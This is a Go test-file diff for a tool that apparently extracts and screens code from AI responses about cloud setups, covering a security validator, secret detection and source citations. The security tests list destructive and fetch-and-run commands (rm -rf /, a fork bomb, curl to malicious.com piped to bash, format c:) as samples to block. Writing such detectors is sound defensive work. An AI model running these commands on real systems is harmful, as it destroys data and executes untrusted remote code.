@@ -967,7 +967,7 @@ func TestExtractCodeSnippets(t *testing.T) {
 		},
 		{
 			name:     "Multiple language snippets",
-			response: "Terraform configuration:\n\n```terraform\nresource \"aws_instance\" \"web\" {\n  ami = \"ami-12345\"\n}\n```\n\nBash script:\n\n```bash\n#!/bin/bash\nterraform apply\necho \"Deployed\"\n```\n\nYAML config:\n\n```yaml\napiVersion: v1\nkind: Pod\nmetadata:\n  name: web-pod\n```",
+			response: "Terraform configuration:\n\n```terraform\nresource \"aws_instance\" \"web\" {\n  ami = \"ami-12345\"\n}\n```\n\nBash script:\n\n```bash\n#!/bin/bash\necho \"Safe deployment\"\n```\n\nYAML config:\n\n```yaml\napiVersion: v1\nkind: Pod\nmetadata:\n  name: web-pod\n```",
 			expected: []CodeSnippet{
 				{
 					Language: "terraform",
@@ -975,7 +975,7 @@ func TestExtractCodeSnippets(t *testing.T) {
 				},
 				{
 					Language: "bash",
-					Code:     "#!/bin/bash\nterraform apply\necho \"Deployed\"",
+					Code:     "#!/bin/bash\necho \"Safe deployment\"",
 				},
 				{
 					Language: "yaml",
@@ -1185,5 +1185,662 @@ func TestPromptValidationWithCodeInstructions(t *testing.T) {
 		if !strings.Contains(prompt, requirement) {
 			t.Errorf("Prompt missing validation requirement: %s", requirement)
 		}
+	}
+}
+
+func TestValidateCodeSecurity(t *testing.T) {
+	tests := []struct {
+		name     string
+		code     string
+		language string
+		expected bool
+	}{
+		{
+			name:     "Safe Terraform code",
+			code:     "resource \"aws_vpc\" \"main\" {\n  cidr_block = \"10.0.0.0/16\"\n  enable_dns_hostnames = true\n}",
+			language: "terraform",
+			expected: true,
+		},
+		{
+			name:     "Safe bash script",
+			code:     "#!/bin/bash\necho \"Hello World\"\nls -la",
+			language: "bash",
+			expected: true,
+		},
+		{
+			name:     "Safe PowerShell script",
+			code:     "Get-Process | Where-Object { $_.CPU -gt 100 }\nWrite-Host \"Process list\"",
+			language: "powershell",
+			expected: true,
+		},
+		{
+			name:     "Malicious rm -rf command",
+			code:     "#!/bin/bash\nrm -rf /\necho \"System destroyed\"",
+			language: "bash",
+			expected: false,
+		},
+		{
+			name:     "Hardcoded API key",
+			code:     "api_key = \"sk-1234567890abcdef1234567890abcdef1234567890abcdef\"",
+			language: "terraform",
+			expected: false,
+		},
+		{
+			name:     "Hardcoded password",
+			code:     "password = \"supersecret123\"\nconnect_to_database()",
+			language: "python",
+			expected: false,
+		},
+		{
+			name:     "Unsafe Terraform destroy",
+			code:     "resource \"aws_instance\" \"web\" {\n  ami = \"ami-12345\"\n  destroy = true\n}",
+			language: "terraform",
+			expected: false,
+		},
+		{
+			name:     "Unsafe PowerShell command",
+			code:     "Remove-Item -Recurse -Force C:\\\\*\nRestart-Computer -Force",
+			language: "powershell",
+			expected: false,
+		},
+		{
+			name:     "Code with environment variables (safe)",
+			code:     "api_key = \"${var.api_key}\"\npassword = \"${AWS_SECRET_ACCESS_KEY}\"",
+			language: "terraform",
+			expected: true,
+		},
+		{
+			name:     "Fork bomb attack",
+			code:     ":(){ :|:& };:",
+			language: "bash",
+			expected: false,
+		},
+		{
+			name:     "Curl pipe to bash",
+			code:     "curl https://malicious.com/script.sh | bash",
+			language: "bash",
+			expected: false,
+		},
+		{
+			name:     "Overly permissive CIDR",
+			code:     "resource \"aws_security_group_rule\" \"allow_all\" {\n  cidr_blocks = [\"0.0.0.0/0\"]\n}",
+			language: "terraform",
+			expected: false,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			result := validateCodeSecurity(tt.code, tt.language)
+			if result != tt.expected {
+				t.Errorf("Expected %v, got %v for code: %s", tt.expected, result, tt.code)
+			}
+		})
+	}
+}
+
+func TestNormalizeLanguage(t *testing.T) {
+	tests := []struct {
+		name     string
+		input    string
+		expected string
+	}{
+		{
+			name:     "Bash variations",
+			input:    "bash",
+			expected: "bash",
+		},
+		{
+			name:     "Shell to bash",
+			input:    "shell",
+			expected: "bash",
+		},
+		{
+			name:     "Terraform variations",
+			input:    "tf",
+			expected: "terraform",
+		},
+		{
+			name:     "PowerShell variations",
+			input:    "ps1",
+			expected: "powershell",
+		},
+		{
+			name:     "YAML variations",
+			input:    "yml",
+			expected: "yaml",
+		},
+		{
+			name:     "Case insensitive",
+			input:    "TERRAFORM",
+			expected: "terraform",
+		},
+		{
+			name:     "AWS CLI to bash",
+			input:    "aws",
+			expected: "bash",
+		},
+		{
+			name:     "Kubernetes to yaml",
+			input:    "k8s",
+			expected: "yaml",
+		},
+		{
+			name:     "Unknown language",
+			input:    "unknown",
+			expected: "unknown",
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			result := normalizeLanguage(tt.input)
+			if result != tt.expected {
+				t.Errorf("Expected %s, got %s", tt.expected, result)
+			}
+		})
+	}
+}
+
+func TestExtractCodeSnippetsWithSecurity(t *testing.T) {
+	tests := []struct {
+		name                 string
+		response             string
+		expectedCount        int
+		expectedLanguages    []string
+		expectedSecurityPass bool
+	}{
+		{
+			name:                 "Safe Terraform code",
+			response:             "Here's the Terraform:\n\n```terraform\nresource \"aws_vpc\" \"main\" {\n  cidr_block = \"10.0.0.0/16\"\n}\n```",
+			expectedCount:        1,
+			expectedLanguages:    []string{"terraform"},
+			expectedSecurityPass: true,
+		},
+		{
+			name:                 "Malicious code filtered out",
+			response:             "Dangerous command:\n\n```bash\nrm -rf /\necho \"System destroyed\"\n```",
+			expectedCount:        0,
+			expectedLanguages:    []string{},
+			expectedSecurityPass: false,
+		},
+		{
+			name:                 "Mixed safe and unsafe code",
+			response:             "Safe code:\n\n```bash\necho \"Hello\"\n```\n\nDangerous code:\n\n```bash\nrm -rf /\n```",
+			expectedCount:        1,
+			expectedLanguages:    []string{"bash"},
+			expectedSecurityPass: true,
+		},
+		{
+			name:                 "Language normalization",
+			response:             "Shell script:\n\n```sh\necho \"Hello from shell\"\n```",
+			expectedCount:        1,
+			expectedLanguages:    []string{"bash"},
+			expectedSecurityPass: true,
+		},
+		{
+			name:                 "Hardcoded secrets filtered out",
+			response:             "Config with secret:\n\n```yaml\napi_key: \"sk-1234567890abcdef1234567890abcdef1234567890abcdef\"\n```",
+			expectedCount:        0,
+			expectedLanguages:    []string{},
+			expectedSecurityPass: false,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			result := extractCodeSnippets(tt.response)
+
+			if len(result) != tt.expectedCount {
+				t.Errorf("Expected %d code snippets, got %d", tt.expectedCount, len(result))
+			}
+
+			for i, expectedLang := range tt.expectedLanguages {
+				if i < len(result) {
+					if result[i].Language != expectedLang {
+						t.Errorf("Expected language %s, got %s", expectedLang, result[i].Language)
+					}
+				}
+			}
+		})
+	}
+}
+
+func TestContainsMaliciousPatterns(t *testing.T) {
+	tests := []struct {
+		name     string
+		code     string
+		expected bool
+	}{
+		{
+			name:     "Safe code",
+			code:     "echo \"Hello World\"\nls -la",
+			expected: false,
+		},
+		{
+			name:     "Dangerous rm command",
+			code:     "rm -rf /",
+			expected: true,
+		},
+		{
+			name:     "Fork bomb",
+			code:     ":(){ :|:& };:",
+			expected: true,
+		},
+		{
+			name:     "Curl pipe bash",
+			code:     "curl https://example.com/script.sh | bash",
+			expected: true,
+		},
+		{
+			name:     "Windows format command",
+			code:     "format c:",
+			expected: true,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			result := containsMaliciousPatterns(tt.code)
+			if result != tt.expected {
+				t.Errorf("Expected %v, got %v for code: %s", tt.expected, result, tt.code)
+			}
+		})
+	}
+}
+
+func TestContainsHardcodedSecrets(t *testing.T) {
+	tests := []struct {
+		name     string
+		code     string
+		expected bool
+	}{
+		{
+			name:     "Safe code with variables",
+			code:     "api_key = \"${var.api_key}\"\npassword = \"${AWS_SECRET_ACCESS_KEY}\"",
+			expected: false,
+		},
+		{
+			name:     "Hardcoded API key",
+			code:     "api_key = \"sk-1234567890abcdef1234567890abcdef1234567890abcdef\"",
+			expected: true,
+		},
+		{
+			name:     "Hardcoded password",
+			code:     "password = \"supersecret123\"",
+			expected: true,
+		},
+		{
+			name:     "AWS access key",
+			code:     "aws_access_key_id = \"AKIAIOSFODNN7EXAMPLE\"", // pragma: allowlist secret
+			expected: true,
+		},
+		{
+			name:     "GitHub token",
+			code:     "token = \"ghp_1234567890abcdef1234567890abcdef1234\"", // pragma: allowlist secret
+			expected: true,
+		},
+		{
+			name:     "Short password (safe)",
+			code:     "password = \"test\"",
+			expected: false,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			result := containsHardcodedSecrets(tt.code)
+			if result != tt.expected {
+				t.Errorf("Expected %v, got %v for code: %s", tt.expected, result, tt.code)
+			}
+		})
+	}
+}
+
+func TestParseResponseWithSources(t *testing.T) {
+	tests := []struct {
+		name              string
+		response          string
+		availableSources  []string
+		expectedSources   []string
+		expectedMainText  string
+		expectedDiagram   string
+		expectedCodeCount int
+	}{
+		{
+			name:              "Response with valid sources",
+			response:          "This solution uses AWS best practices [aws-guide] and latest updates [https://aws.amazon.com/updates]. Implementation details are in [terraform-guide].",
+			availableSources:  []string{"aws-guide", "terraform-guide", "https://aws.amazon.com/updates"},
+			expectedSources:   []string{"aws-guide", "https://aws.amazon.com/updates", "terraform-guide"},
+			expectedMainText:  "This solution uses AWS best practices [aws-guide] and latest updates [https://aws.amazon.com/updates]. Implementation details are in [terraform-guide].",
+			expectedDiagram:   "",
+			expectedCodeCount: 0,
+		},
+		{
+			name:              "Response with invalid sources filtered out",
+			response:          "Based on [aws-guide] and [invalid-source], this approach works [terraform-guide].",
+			availableSources:  []string{"aws-guide", "terraform-guide"},
+			expectedSources:   []string{"aws-guide", "terraform-guide"},
+			expectedMainText:  "Based on [aws-guide] and [invalid-source], this approach works [terraform-guide].",
+			expectedDiagram:   "",
+			expectedCodeCount: 0,
+		},
+		{
+			name:              "Response with mixed document and URL sources",
+			response:          "Architecture details from [arch-doc] and recent updates from [https://docs.aws.amazon.com/ec2/latest/] provide comprehensive guidance [best-practices].",
+			availableSources:  []string{"arch-doc", "best-practices", "https://docs.aws.amazon.com/ec2/latest/"},
+			expectedSources:   []string{"arch-doc", "https://docs.aws.amazon.com/ec2/latest/", "best-practices"},
+			expectedMainText:  "Architecture details from [arch-doc] and recent updates from [https://docs.aws.amazon.com/ec2/latest/] provide comprehensive guidance [best-practices].",
+			expectedDiagram:   "",
+			expectedCodeCount: 0,
+		},
+		{
+			name:              "Response with diagram and sources",
+			response:          "Here's the architecture [aws-guide]:\n\n```mermaid\ngraph TD\n    A[VPC] --> B[EC2]\n    B --> C[RDS]\n```\n\nImplementation follows [terraform-guide].",
+			availableSources:  []string{"aws-guide", "terraform-guide"},
+			expectedSources:   []string{"aws-guide", "terraform-guide"},
+			expectedMainText:  "Here's the architecture [aws-guide]:",
+			expectedDiagram:   "graph TD\n    A[VPC] --> B[EC2]\n    B --> C[RDS]",
+			expectedCodeCount: 0,
+		},
+		{
+			name:              "Response with code and sources",
+			response:          "Deploy with this configuration [terraform-guide]:\n\n```terraform\nresource \"aws_vpc\" \"main\" {\n  cidr_block = \"10.0.0.0/16\"\n}\n```\n\nBased on [aws-docs].",
+			availableSources:  []string{"terraform-guide", "aws-docs"},
+			expectedSources:   []string{"terraform-guide", "aws-docs"},
+			expectedMainText:  "Deploy with this configuration [terraform-guide]:",
+			expectedDiagram:   "",
+			expectedCodeCount: 1,
+		},
+		{
+			name:              "Response with no available sources list",
+			response:          "This uses [any-source] and [another-source] for reference.",
+			availableSources:  []string{},
+			expectedSources:   []string{"any-source", "another-source"},
+			expectedMainText:  "This uses [any-source] and [another-source] for reference.",
+			expectedDiagram:   "",
+			expectedCodeCount: 0,
+		},
+		{
+			name:              "Response with duplicate sources",
+			response:          "First reference [aws-guide] and second reference [aws-guide] and different [terraform-guide].",
+			availableSources:  []string{"aws-guide", "terraform-guide"},
+			expectedSources:   []string{"aws-guide", "terraform-guide"},
+			expectedMainText:  "First reference [aws-guide] and second reference [aws-guide] and different [terraform-guide].",
+			expectedDiagram:   "",
+			expectedCodeCount: 0,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			result := ParseResponseWithSources(tt.response, tt.availableSources)
+
+			// Check sources
+			if len(result.Sources) != len(tt.expectedSources) {
+				t.Errorf("Expected %d sources, got %d. Expected: %v, Got: %v", len(tt.expectedSources), len(result.Sources), tt.expectedSources, result.Sources)
+			} else {
+				for _, expected := range tt.expectedSources {
+					found := false
+					for _, actual := range result.Sources {
+						if actual == expected {
+							found = true
+							break
+						}
+					}
+					if !found {
+						t.Errorf("Expected source '%s' not found in result sources: %v", expected, result.Sources)
+					}
+				}
+			}
+
+			// Check main text contains expected content
+			if !strings.Contains(result.MainText, tt.expectedMainText) {
+				t.Errorf("Expected main text to contain '%s', got: %s", tt.expectedMainText, result.MainText)
+			}
+
+			// Check diagram
+			if result.DiagramCode != tt.expectedDiagram {
+				t.Errorf("Expected diagram code '%s', got '%s'", tt.expectedDiagram, result.DiagramCode)
+			}
+
+			// Check code snippets count
+			if len(result.CodeSnippets) != tt.expectedCodeCount {
+				t.Errorf("Expected %d code snippets, got %d", tt.expectedCodeCount, len(result.CodeSnippets))
+			}
+		})
+	}
+}
+
+func TestExtractURLFromWebResult(t *testing.T) {
+	tests := []struct {
+		name      string
+		webResult string
+		expected  string
+	}{
+		{
+			name:      "Full web result with title, snippet, and URL",
+			webResult: "Title: AWS EC2 Updates\nSnippet: Latest EC2 instance types and pricing\nURL: https://aws.amazon.com/ec2/updates",
+			expected:  "https://aws.amazon.com/ec2/updates",
+		},
+		{
+			name:      "Web result with title and URL only",
+			webResult: "Title: Azure Virtual Machines\nURL: https://docs.microsoft.com/en-us/azure/virtual-machines/",
+			expected:  "https://docs.microsoft.com/en-us/azure/virtual-machines/",
+		},
+		{
+			name:      "Web result with snippet and URL only",
+			webResult: "Snippet: Learn about Google Cloud Compute Engine\nURL: https://cloud.google.com/compute",
+			expected:  "https://cloud.google.com/compute",
+		},
+		{
+			name:      "Web result with no URL",
+			webResult: "Title: Some Article\nSnippet: This is content without a URL",
+			expected:  "",
+		},
+		{
+			name:      "Web result with multiple lines and URL",
+			webResult: "Title: Multi-line Title\nWith Additional Content\nSnippet: This is a longer snippet\nwith multiple lines\nURL: https://example.com/resource",
+			expected:  "https://example.com/resource",
+		},
+		{
+			name:      "Web result with URL in different position",
+			webResult: "URL: https://docs.aws.amazon.com/\nTitle: AWS Documentation\nSnippet: Official AWS docs",
+			expected:  "https://docs.aws.amazon.com/",
+		},
+		{
+			name:      "Empty web result",
+			webResult: "",
+			expected:  "",
+		},
+		{
+			name:      "Web result with URL containing parameters",
+			webResult: "Title: Search Results\nURL: https://example.com/search?q=aws&type=docs\nSnippet: Search results for AWS documentation",
+			expected:  "https://example.com/search?q=aws&type=docs",
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			result := extractURLFromWebResult(tt.webResult)
+			if result != tt.expected {
+				t.Errorf("Expected URL '%s', got '%s'", tt.expected, result)
+			}
+		})
+	}
+}
+
+func TestIsValidSourceCitation(t *testing.T) {
+	tests := []struct {
+		name     string
+		citation string
+		expected bool
+	}{
+		{
+			name:     "Valid document ID",
+			citation: "aws-guide-2024",
+			expected: true,
+		},
+		{
+			name:     "Valid URL",
+			citation: "https://docs.aws.amazon.com/ec2/latest/",
+			expected: true,
+		},
+		{
+			name:     "Valid source with underscores",
+			citation: "terraform_deployment_guide",
+			expected: true,
+		},
+		{
+			name:     "Valid source with spaces",
+			citation: "AWS Best Practices Guide",
+			expected: true,
+		},
+		{
+			name:     "Invalid - common Mermaid keyword",
+			citation: "graph",
+			expected: false,
+		},
+		{
+			name:     "Invalid - subgraph keyword",
+			citation: "subgraph",
+			expected: false,
+		},
+		{
+			name:     "Invalid - end keyword",
+			citation: "end",
+			expected: false,
+		},
+		{
+			name:     "Invalid - simple diagram node",
+			citation: "VPC",
+			expected: false,
+		},
+		{
+			name:     "Invalid - simple diagram node",
+			citation: "EC2",
+			expected: false,
+		},
+		{
+			name:     "Valid - longer document ID",
+			citation: "aws-vpc-configuration-guide-2024",
+			expected: true,
+		},
+		{
+			name:     "Valid - URL with parameters",
+			citation: "https://example.com/docs?page=aws&section=vpc",
+			expected: true,
+		},
+		{
+			name:     "Valid - complex document ID",
+			citation: "azure-hybrid-architecture-v2.1",
+			expected: true,
+		},
+		{
+			name:     "Invalid - case insensitive Mermaid keyword",
+			citation: "GRAPH",
+			expected: false,
+		},
+		{
+			name:     "Invalid - style keyword",
+			citation: "style",
+			expected: false,
+		},
+		{
+			name:     "Invalid - class keyword",
+			citation: "class",
+			expected: false,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			result := isValidSourceCitation(tt.citation)
+			if result != tt.expected {
+				t.Errorf("Expected %v, got %v for citation: %s", tt.expected, result, tt.citation)
+			}
+		})
+	}
+}
+
+func TestBuildPromptWithWebResultSourceAttribution(t *testing.T) {
+	tests := []struct {
+		name                string
+		query               string
+		contextItems        []ContextItem
+		webResults          []string
+		expectedContains    []string
+		expectedNotContains []string
+	}{
+		{
+			name:  "Web results with URLs get source attribution",
+			query: "Latest AWS updates",
+			contextItems: []ContextItem{
+				{Content: "AWS services overview", SourceID: "aws-guide"},
+			},
+			webResults: []string{
+				"Title: AWS EC2 Updates\nSnippet: New instance types available\nURL: https://aws.amazon.com/ec2/updates",
+				"Title: Lambda Pricing\nURL: https://aws.amazon.com/lambda/pricing/",
+			},
+			expectedContains: []string{
+				"Context 1 [aws-guide]: AWS services overview",
+				"Web Result 1 [https://aws.amazon.com/ec2/updates]: Title: AWS EC2 Updates",
+				"Web Result 2 [https://aws.amazon.com/lambda/pricing/]: Title: Lambda Pricing",
+			},
+			expectedNotContains: []string{},
+		},
+		{
+			name:  "Web results without URLs don't get source attribution",
+			query: "General information",
+			contextItems: []ContextItem{
+				{Content: "General cloud info", SourceID: "general-guide"},
+			},
+			webResults: []string{
+				"Title: Some Article\nSnippet: Content without URL",
+			},
+			expectedContains: []string{
+				"Context 1 [general-guide]: General cloud info",
+				"Web Result 1: Title: Some Article",
+			},
+			expectedNotContains: []string{
+				"Web Result 1 [",
+			},
+		},
+		{
+			name:  "Enhanced citation instructions in prompt",
+			query: "Design AWS architecture",
+			contextItems: []ContextItem{
+				{Content: "Architecture patterns", SourceID: "arch-guide"},
+			},
+			webResults: []string{
+				"Title: Latest AWS Features\nURL: https://aws.amazon.com/new/",
+			},
+			expectedContains: []string{
+				"SOURCE CITATION REQUIREMENTS:",
+				"When referencing information from internal documents, cite with [source_id] format",
+				"When referencing information from web search results, cite with [URL] format",
+				"Every factual claim should have a corresponding source citation",
+				"Use the exact source identifiers provided in the context sections above",
+			},
+			expectedNotContains: []string{},
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			result := BuildPrompt(tt.query, tt.contextItems, tt.webResults)
+
+			for _, expected := range tt.expectedContains {
+				if !strings.Contains(result, expected) {
+					t.Errorf("Expected prompt to contain '%s', but it didn't", expected)
+				}
+			}
+
+			for _, notExpected := range tt.expectedNotContains {
+				if strings.Contains(result, notExpected) {
+					t.Errorf("Expected prompt to NOT contain '%s', but it did", notExpected)
+				}
+			}
+		})
 	}
 }
